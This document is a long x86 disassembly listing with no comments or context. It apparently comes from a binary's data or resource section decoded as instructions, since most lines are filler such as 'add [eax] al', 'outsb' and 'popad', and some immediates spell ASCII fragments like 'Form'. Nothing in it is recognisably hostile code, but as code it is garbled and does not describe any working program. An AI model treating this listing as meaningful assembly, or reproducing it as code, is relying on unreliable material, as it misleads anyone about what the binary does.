add [ eax + 0x1 ] al
add [ es : esi ] cl
push eax
popad
jb r-xdata
add [ eax - 0x80000000 ] al
sub eax 0x68530800
outsd
ja r-xdata
outsb
add [ ecx ] 0x0
add [ eax ] al
sub [ eax ] eax
or edx [ eax + 0x61 ]
jb r-xdata
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
stosb [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
stosd [ edi ]
outsb
je r-xdata
add [ eax ] dl
cmpsb [ esi ] [ edi ]
add edx [ edi ]
add bh bh
imul ebp [ esi + 0x74 ] r-xdata
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
outsb
je r-xdata
je r-xdata
jne r-xdata
add [ ecx ] 0x0
add [ eax ] al
sub eax [ eax ]
outsb
je r-xdata
sub [ eax ] al
or edx [ eax + 0x61 ]
jb r-xdata
add [ eax ] al
add [ eax + 0x1 ] al
add ecx eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
daa
add [ eax ] dl
push eax
popad
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ esi - 0x546febfd ] ah
xor [ eax + eax ] 0xe
jpe r-xdata
inc ebx
popad
outsb
push edx
jae r-xdata
stosd [ edi ]
test al 0xfa
stosb [ edi ]
add esp esp
and ch [ ebx + 0x3 ]
add [ ecx ] 0x0
add [ eax ] al
xor [ eax ] al
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
test eax 0xb003aa
add bh bh
mov al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or ecx [ edi + 0x6e ]
jo r-xdata
adc [ esi + 0x8e03 ] ah
push cs
push eax
popad
jb r-xdata
je r-xdata
inc esi
add [ fs : eax ] dl
cmpsb [ esi ] [ edi ]
outsb
je r-xdata
jb r-xdata
add [ edx ] cl
push eax
popad
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x4f0a0037 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
js r-xdata
add [ eax ] al
cld
jne r-xdata
imul ebp [ esi + 0x74 ] r-xdata
add [ eax ] 0x0
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
fadd [ ecx ]
add bh bh
or [ edi - 0x55 ] bh
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jne r-xdata
jo r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
cmpsb [ esi ] [ edi ]
add ebx [ ecx ]
add bh bh
mov ah 0xfc
stosb [ edi ]
add eax [ ecx ]
jle r-xdata
push 0x6948776f
outsb
je r-xdata
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ esi + 0x1dd03 ] ah
inc [ esi + edi * 2 - 0x55 ]
or [ edi + 0x6e ] ecx
jb r-xdata
shl [ ebp + 0xd803aa ] 0x0
push eax
outsd
add [ eax ] al
das
add [ edi ] al
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] al
add edx [ eax ]
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ebx ]
stosd [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070032 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
mov eax 0xb8ff0000
add [ eax ] al
inc [ ecx ]
adc [ esi + 0x5703 ] ah
[ eax - 0x1bfc5506 ]
adc [ esi + 0x8d03 ] ah
add esi eax
jle r-xdata
stosb [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
daa
stosb [ edi ]
add eax [ eax + 0x3cff0000 ]
sti
stosb [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009002c ] al
inc edi
je r-xdata
cld
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0036 ] al
movsd [ edi ] [ esi ]
stosb [ edi ]
add ebx eax
add [ eax ] al
jo r-xdata
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
or cl [ edi + 0x6e ]
jb r-xdata
inc esp
imul esi [ ebp + 0x49 ] 0xf86f666e
cmp [ ecx ] 0x0
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
add esi eax
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jb r-xdata
jo r-xdata
jo r-xdata
jne r-xdata
add [ eax ] eax
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al 0x0
push cs
jae r-xdata
cld
jne r-xdata
dec ebp
outsd
jne r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
add [ eax + 0x4f07003c ] al
add [ eax ] al
dec edi
jbe r-xdata
dec edi
outsb
dec ebp
outsd
jne r-xdata
jb r-xdata
cmpsb [ esi ] [ edi ]
stosb [ edi ]
add edi eax
add [ eax ] al
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] al
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
cmpsd [ esi ] [ edi ]
stosb [ edi ]
add ebp eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f130033 ] al
outsb
inc ebx
outsd
outsb
jae r-xdata
test eax 0xb803aa
add bh bh
mov eax 0x1ff0000
add ebx [ eax ]
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0035 ] al
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
loopne r-xdata
add [ eax + 0x4f100046 ] al
outsb
dec ebp
je r-xdata
add edi [ eax ]
add [ eax ] eax
push 0x886c6565
stosb [ edi ]
stosb [ edi ]
add ecx [ eax + 0x1 ]
dec esp
popad
jbe r-xdata
inc edx
add [ edi + ecx * 2 ] cl
sbb al 0xa3
stosb [ edi ]
add eax eax
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0040 ] al
outsb
dec ebp
outsd
jne r-xdata
outsb
inc ebp
outsb
je r-xdata
jne r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09003b ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
jmp eax
add bh bh
loopne r-xdata
push ebx
je r-xdata
push edi
dec ebp
outsd
jne r-xdata
adc [ edi + 0x6e ] cl
sbb al 0xa3
stosb [ edi ]
add edx eax
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090044 ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0041 ] al
outsb
dec ebp
outsd
jne r-xdata
mov [ 0x12803aa ] eax
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aas
add [ edi ] cl
dec ecx
outsb
outsw
clc
dec edi
xchg esp eax
mov [ 0xc803aa ] eax
add bh bh
enter 0x0 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ebx
add [ ebx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
outsd
ja r-xdata
inc esp
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x68 ] bp
cmpsb [ esi ] [ edi ]
stosb [ edi ]
add ecx [ eax ]
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4f09003a ] al
outsb
add edi eax
add [ eax ] eax
jne r-xdata
jo r-xdata
outsb
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ss : edx ] cl
dec edi
imul edi [ edx + ecx * 4 ] 0xffffffa7
add eax [ ecx ]
movsd [ edi ] [ esi ]
sbb eax 0x2bea1e43
out 0x4d eax
mov [ 0xfffffffffd45cc30 ] eax
das
mov cl 0xec
jb r-xdata
inc esp
outsd
arpl [ ebx + 0x20 ] bp
cmpsb [ esi ] [ edi ]
stosb [ edi ]
add eax [ eax ]
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b004a ] al
outsb
push ebx
je r-xdata
mov [ edx + 0x15003aa ] ch
add bh bh
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
outsd
jne r-xdata
push ebp
jae r-xdata
inc ebp
outsb
add [ eax ] cl
dec edi
outsb
push edx
jae r-xdata
push edi
push 0x446c6565
outsd
ja r-xdata
outsd
jbe r-xdata
dec ebp
movsd [ edi ] [ esi ]
stosb [ edi ]
add esp eax
add [ eax ] al
jmp eax
or [ ecx + 0x4f ] cl
add bh bh
dec [ ebx - 0x53dd5340 ]
add ecx [ edi ]
add eax 0x6d726f46
jae r-xdata
in al dx
insb
invd
dec ecx
dec edi
jb r-xdata
inc esp
jb r-xdata
push edi
push 0x556c6565
outsb
dec ebp
outsd
jne r-xdata
stosb [ edi ]
stosb [ edi ]
add eax [ eax + 0x1 ]
add bh bh
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0045 ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0047 ] al
outsb
dec ebp
jo r-xdata
push ebp
outsb
dec ebp
outsd
jne r-xdata
add [ eax + eax + 0x9 ] 0x4f
jb r-xdata
dec edi
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x78 ] bp
and ch [ ebx + eax + 0x44490d0f ]
jae r-xdata
jpe r-xdata
jae r-xdata
xor al 0x11
cmpsb [ esi ] [ edi ]
add eax [ ecx ]
shl ecx 0x2
int 0xda
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4605da82
inc esi
outsd
jb r-xdata
mov esp 0x2003aaa7
add al [ eax ]
jmp [ eax ]
jo r-xdata
insb
push ebp
jne r-xdata
je r-xdata
jne r-xdata
jb r-xdata
outsb
jb r-xdata
add [ eax ] cl
sub [ eax + 0xf003aa ] ch
add bh bh
[ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0049 ] al
outsb
bound ebp [ ecx + 0x53 ]
jns r-xdata
outsd
jb r-xdata
jb r-xdata
jae r-xdata
add bh bh
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
insb
mov [ edx + 0x14803aa ] ch
add ebp eax
add [ eax ] al
outsb
add esi [ eax ]
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0042 ] al
outsd
popad
jns r-xdata
outsd
jb r-xdata
inc esi
outsd
outsd
insb
je r-xdata
push es
popad
insb
or ah [ esi + 0x73 ]
dec ebp
outsd
jb r-xdata
or esp [ esi + 0x73 ]
push ebx
je r-xdata
dec [ ebp + 0x22dc0040 ]
lodsb [ esi ]
add edx [ ecx ]
push cs
push esp
add bh bh
push eax
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bh bh
adc [ eax + 0x6f ] esi
jo r-xdata
outsb
or [ fs : eax + 0x6f ] esi
inc esp
popa
jne r-xdata
insd
mov eax eax
test al 0x23
inc esi
outsd
jb r-xdata
insd
imul edi [ edx + 0x65 ] 0x4d69620a
inc esp
dec ecx
inc esi
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ebx
outsb
je r-xdata
jb r-xdata
lodsb [ esi ]
add eax [ esi ]
or al 0x54
jns r-xdata
add ecx [ ebx ]
push esp
inc edx
jo r-xdata
jo r-xdata
je r-xdata
inc edx
dec ebp
outsb
jne r-xdata
arpl [ edi + 0x6e ] bp
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ebx - 0x54 ] dl
add ecx [ edx ]
imul edx [ ebx + 0x79 ] 0x6d657473
add [ eax ] al
add [ eax + 0x24 ] bl
lodsb [ esi ]
je r-xdata
inc esp
popa
inc esp
popa
jne r-xdata
jne r-xdata
pop esp
je r-xdata
popad
js r-xdata
or ah [ edx + 0x69 ]
dec ebp
bound ebp [ ecx + 0x4d ]
imul ebp [ esi + 0x69 ] 0x657a696d
insb
jns r-xdata
jae r-xdata
dec edi
insb
jo r-xdata
insd
imul edi [ edx + 0x65 ] 0x48696206
jo r-xdata
jb r-xdata
outsb
insb
jns r-xdata
arpl [ edi + 0x6e ] bp
jae r-xdata
bound ebp [ ecx + 0x48 ]
outsb
push esp
outsd
jo r-xdata
outsd
outsb
inc ecx
inc esi
outsd
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x436d726f
outsb
je r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ ebx + 0x700a03ac ] bh
outsd
inc esp
jae r-xdata
je r-xdata
je r-xdata
add ecx [ edi ]
push esp
imul edi [ edx + 0x65 ] 0x796c6e4f
push cs
je r-xdata
popad
je r-xdata
pshufw mm5 [ edi + 0x44 ] 0x65
jae r-xdata
jo r-xdata
inc esp
dec ecx
inc ebx
push 0x9646c69
jae r-xdata
shr [ eax + 0x603ac23 ] 0xc
push esp
push cs
jo r-xdata
or ah [ ebp + ebp * 2 + 0x4d ]
insd
push eax
adc [ eax + 0x6f ] dh
jo r-xdata
jae r-xdata
and ebp [ ebx + eax - 0x53dc3f70 ]
add eax [ ebx ]
or [ eax + edx * 2 + 0x6f ] edx
push esp
lea eax [ eax ]
pop eax
and ebp [ ebx + eax + 0x42540b03 ]
inc esi
outsd
jb r-xdata
push es
add eax 0x6d726f46
jae r-xdata
jb r-xdata
jb r-xdata
inc esi
nop
inc esi
outsd
jb r-xdata
jae r-xdata
outsd
inc ebx
insb
push eax
jb r-xdata
jb r-xdata
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x1
outsd
jae r-xdata
popad
dec ebp
je r-xdata
add ecx [ ecx ]
insd
inc esp
jae r-xdata
add [ eax ] al
add eax [ eax ]
add [ eax ] al
pop eax
and al 0xac
inc esp
popa
jne r-xdata
insd
popad
jb r-xdata
inc esp
jae r-xdata
outsd
and ebp [ ebx + eax + 0x50540903 ]
jae r-xdata
and al 0xac
add eax [ esi ]
jo r-xdata
outsd
inc eax
add [ eax + 0x25 ] al
lodsb [ esi ]
add ecx [ eax ]
or edx [ ebx + eax * 2 + 0x6c ]
andps xmm0 [ ebp + 0x66 ]
jo r-xdata
and al 0xac
add eax [ ebx ]
or edx [ eax + edx * 2 + 0x72 ]
add eax 0x6d726f46
jo r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ esp + 0x700603ac ] ch
outsd
arpl [ ecx + 0x6c ] sp
inc ebx
outsb
je r-xdata
outsd
arpl [ ecx + 0x4e ] sp
outsd
outsb
push es
arpl [ ecx + 0x48 ] sp
imul esp [ ebp + 0x6 ] 0x72466163
or ah [ gs : ebx + 0x61 ]
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
outsb
or al 0x54
inc ebx
insb
outsd
jae r-xdata
add [ esi ] eax
jb r-xdata
or [ ebp + ebp * 2 + 0x50 ] esp
clc
and al 0xac
add eax [ ebx ]
or al 0x54
inc ebx
insb
outsd
jae r-xdata
inc ebx
insb
outsd
inc ebp
jbe r-xdata
jae r-xdata
jo r-xdata
push es
arpl [ ecx + 0x46 ] sp
jb r-xdata
outsb
je r-xdata
jb r-xdata
jb r-xdata
jo r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
hlt
push eax
outsd
jo r-xdata
jb r-xdata
inc eax
add [ eax + 0x23 ] bl
lodsb [ esi ]
add eax [ ebx ]
or edx [ edx + eax * 2 + 0x6f ]
inc eax
dec esi
outsd
outsb
push cs
imul ebp [ esi + 0x74 ] 0x6c616353
and al 0xac
add eax [ ebx ]
push esp
push eax
dec edi
ja r-xdata
jb r-xdata
inc ebp
jbe r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx + edx ] dl
cmpsb [ esi ] [ edi ]
add esi esp
and al 0xac
add ecx [ ebp + 0x25840040 ]
lodsb [ esi ]
add ecx [ eax ]
adc [ ebx + eax * 2 + 0x6c ] dl
outsd
jae r-xdata
insd
popad
outsb
add al 0x57
outsd
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] dl
cmpsb [ esi ] [ edi ]
add eax [ eax ]
adc [ esi + 0x25c89003 ] ah
lodsb [ esi ]
add ecx [ eax ]
push cs
push esp
push ebx
push 0x4374726f
jne r-xdata
jae r-xdata
outsb
je r-xdata
jb r-xdata
push ecx
jne r-xdata
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add eax 0x6d726f46
jae r-xdata
or ah [ gs : ebx + 0x61 ]
add [ eax ] al
add ah dh
and al 0xac
add eax [ esi ]
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
or al 0x64
insd
add [ ebx ] al
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
jb r-xdata
inc esi
outsd
jb r-xdata
outsd
insb
popad
outsb
outsb
je r-xdata
outsd
outsd
insb
jne r-xdata
add [ esp + eax * 2 ] al
popad
je r-xdata
outsb
add [ eax ] dl
cmpsb [ esi ] [ edi ]
add eax [ eax ]
push 0x3c03a610
adc [ esi - 0x59effffd ] ah
add ecx [ ebp + 0x26600040 ]
lodsb [ esi ]
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
or [ esi ] al
imul ebp [ edi + 0x6e ] 0x700c6c61
outsd
push eax
jb r-xdata
popad
outsb
add [ eax ] al
jb r-xdata
imul ebp [ esi + 0x46 ] 0xc6d726f
insd
jb r-xdata
insd
outsd
add [ eax ] al
lodsb [ esi ]
jae r-xdata
xor al 0x43
jo r-xdata
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
push esp
push edi
dec ebp
dec ebx
jns r-xdata
add eax [ ebx ]
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
cmp al 0x10
cmpsb [ esi ] [ edi ]
add eax [ eax ]
adc [ esi + 0x408d03 ] ah
pushad
lodsb [ es : esi ]
jbe r-xdata
lodsb [ esi ]
add esi [ eax - 0x7 ]
outsd
or dh [ eax + 0x6d ]
inc ebp
js r-xdata
pop es
dec ecx
outsb
je r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
outsb
je r-xdata
jo r-xdata
inc ebp
jbe r-xdata
adc [ eax + 0x6f ] esi
add ebx [ eax + 0x63 ]
stosb [ edi ]
add ecx [ eax ]
test al 0x3
cmpsb [ esi ] [ edi ]
add eax eax
pop edi
lodsb [ esi ]
add ebx [ eax - 0x73fc5478 ]
lodsb [ esi ]
add esp [ esi + 0x5c03ac29 ]
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ esi - 0x54 ] bl
dec eax
popad
outsb
insb
pop es
inc edx
pop es
add eax [ esi ]
jo r-xdata
add [ eax ] al
pop esp
lodsb [ es : esi ]
outsb
je r-xdata
inc ebx
stc
insb
imul esp [ ebx + 0x69 ] 0x6f460574
jb r-xdata
add eax [ eax ]
add [ eax - 0xffc53eb ] bh
cmp eax 0x5d5403a8
lodsb [ esi ]
add ebx [ eax + 0x5f ]
lodsb [ esi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx [ eax - 0x6b ]
lodsb [ esi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
imul esi [ ebp + eax + 0x46 ] 0x736d726f
in al 0x26
lodsb [ esi ]
jb r-xdata
and eax 0xb0803ac
push esp
outsd
inc esi
imul esi [ ebp + eax + 0x46 ] 0x736d726f
add [ eax ] al
add [ eax ] al
adc [ esi - 0x53d9fbfd ] ah
add ecx [ eax ]
or dl [ eax + ecx * 2 + 0x65 ]
insb
outsb
je r-xdata
lodsb [ esi ]
add edx eax
stosb [ edi ]
cmpsd [ esi ] [ edi ]
add edi [ eax + 0x1c03ac61 ]
dec esi
add [ edi ] al
inc ebx
outsd
insd
add eax [ eax ]
pop es
xor [ edi - 0x54 ] ch
add esp esp
cmp ch [ eax - 0x5340fffd ]
add ecx eax
pop ebx
lodsb [ esi ]
add edi [ edx + eax * 4 - 0x7737fc55 ]
stosd [ edi ]
add edx [ eax + ecx * 4 ]
stosd [ edi ]
add ebp [ eax - 0x14 ]
stosb [ edi ]
add eax [ eax + 0x6403ab7d ]
imul ebp [ ebx + eax + sub_3ab7a0c ] 0xffffffa8
jmp r-xdata
jae r-xdata
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
bound ebp [ ebx + eax + sub_3ac6358 ]
jo r-xdata
mov eax 0x1c03ac61
inc ecx
outsd
outsb
push es
jo r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
daa
lodsb [ esi ]
add edi [ eax + 0x3ac29 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] dl
sub [ ebx + eax + r-xdata ] ch
pop esp
lodsb [ es : esi ]
pop es
inc edx
outsd
outsd
insb
popad
inc edx
outsd
add [ eax ] ecx
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
sub_3ac2a18
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
xchg ebp eax
lodsb [ esi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
lodsb [ esi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp - 0x54 ] ah
add esp [ eax + 0x3 ]
add [ eax ] al
cwde
lodsb [ es : esi ]
add esi eax
cmp eax 0x5d5403a8
lodsb [ esi ]
add ebx [ eax + 0x5f ]
lodsb [ esi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx [ eax - 0x6b ]
add ebx [ eax + 0x63 ]
lodsb [ esi ]
add esi [ eax - 0x7 ]
stosb [ edi ]
add ecx [ eax ]
test al 0x3
xor [ edi - 0x54 ] ch
add esp esp
cmp ch [ eax - 0x5340fffd ]
add ecx eax
pop ebx
lodsb [ esi ]
add edi [ edx + eax * 4 - 0x7737fc55 ]
stosd [ edi ]
add edx [ eax + ecx * 4 ]
stosd [ edi ]
add ebp [ eax - 0x14 ]
stosb [ edi ]
add eax [ eax + 0x6403ab7d ]
imul ebp [ ebx + eax + sub_3ab7a0c ] 0xffffffa8
jmp r-xdata
cmpsb [ esi ] [ edi ]
add eax eax
pop edi
lodsb [ esi ]
add ebx [ eax - 0x73fc5478 ]
lodsb [ esi ]
add edx eax
stosb [ edi ]
cmpsd [ esi ] [ edi ]
add edi [ eax + 0x1c03ac61 ]
bound ebp [ ebx + eax + sub_3ac6358 ]
jo r-xdata
inc ebx
sub_3ac2b91
sbb ch ch
stosb [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41060011 ] al
push esp
inc esi
outsd
jb r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x410d0012 ] al
arpl [ ecx + ebp * 2 + 0x76 ] si
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
inc [ edi + ebp * 8 ]
stosb [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
jo r-xdata
lahf
stosb [ edi ]
add esp [ ecx ]
add bh bh
js r-xdata
outsd
insb
int3
add [ eax ] al
pop ss
add [ edx ] cl
inc ecx
jne r-xdata
popad
inc edx
insb
outsb
push esp
adc [ esi + 0x32903 ] ah
push [ eax - 0x40 ]
lodsb [ esi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0x0
add [ eax ] al
adc eax 0x6c410f00
jo r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
aam 0xb7
stosb [ edi ]
add ebp [ eax + 0x2 ]
add bh bh
mov ah 0x95
lodsb [ esi ]
add esi esp
jg r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
push es
inc ecx
lodsb [ esi ]
add eax [ edi ]
add eax 0x726f4654
insd
pushad
sub ch [ ebx + eax + r-xdata ]
push 0x6f460500
jb r-xdata
inc edx
insb
outsb
push esi
popad
insb
jne r-xdata
stosb [ edi ]
add edx [ ebp + ebp * 8 + 0x3aa ]
add [ eax + 0x3 ] al
push ss
add [ edi ] al
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
pop ss
lodsb [ esi ]
add esi [ ecx + 0x2 ]
add bh bh
add al 0x7c
outsd
push ebx
arpl [ edx + 0x6f ] si
insb
insb
add [ eax ] dl
cmpsb [ esi ] [ edi ]
add ebx [ eax + eax ]
add [ eax ] al
sbb [ eax ] al
or [ ecx + 0x75 ] al
je r-xdata
popad
[ eax + eax * 8 - 0x54 ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or al [ ecx + 0x6c ]
jo r-xdata
adc [ esi + 0x32803 ] ah
jae r-xdata
outsd
insb
or [ edx - 0x54 ] bh
add esi esp
jg r-xdata
add [ eax ] dl
cmpsb [ esi ] [ edi ]
add ebx [ eax + 0x2 ]
add bh bh
in al dx
push esp
lodsb [ esi ]
add edx eax
push 0xffffffac
add eax [ eax ]
add [ eax ] al
add [ eax ] 0x0
pop edi
add [ eax ] al
push [ eax + eax ]
add eax [ eax ]
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
sbb eax [ eax ]
or eax [ edx + 0x6f ]
jb r-xdata
je r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
add [ eax ] 0x0
add [ eax ] al
adc eax [ eax ]
add eax 0x67696c41
outsb
add [ eax ] dl
cmpsb [ esi ] [ edi ]
add ebp [ eax ]
add eax [ eax ]
add [ eax + 0x3c03a78d ] ch
add [ eax ] al
jmp [ eax ]
adc [ esi + 0x5c03 ] ah
add eax [ eax ]
add [ eax ] al
add [ edi ] 0x0
add [ eax ] al
sbb al [ eax ]
or eax [ edx + 0x6f ]
jb r-xdata
add [ eax ] al
sbb [ esi ] 0x0
or al 0x43
jb r-xdata
pop eax
insd
insb
pushad
mov cl 0xaa
add ebx [ ecx + eax + 0x7df4ff00 ]
stosd [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al 0x0
or eax [ edx + 0x6f ]
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307001d ] al
popad
jo r-xdata
jb r-xdata
insb
imul esp [ ebp + 0x6e ] 0x69654874
push 0xa6103c74
add edi esp
hlt
add ecx [ ebp + ebp * 2 + 0x6a9803ac ]
lodsb [ esi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430c001e ] al
popad
outsb
mov eax 0x7003a873
add [ eax ] al
[ eax ]
add [ eax + 0x430b001f ] al
add [ eax ] al
jb r-xdata
push eax
add eax [ eax ]
imul ebp [ edi + 0x6e ] r-xdata
inc eax
cmc
stosb [ edi ]
arpl [ edi + 0x6e ] bp
jae r-xdata
push ebp
jae r-xdata
popad
jb r-xdata
lodsb [ esi ]
add ebx [ eax + 0x3ac6a ]
add [ eax ] al
add [ eax ] 0x0
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
mov bl bh
stosb [ edi ]
add edi [ eax - 0xbfc5505 ]
jg r-xdata
add [ eax ] al
add [ eax + 0x1 ] al
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
lodsb [ esi ]
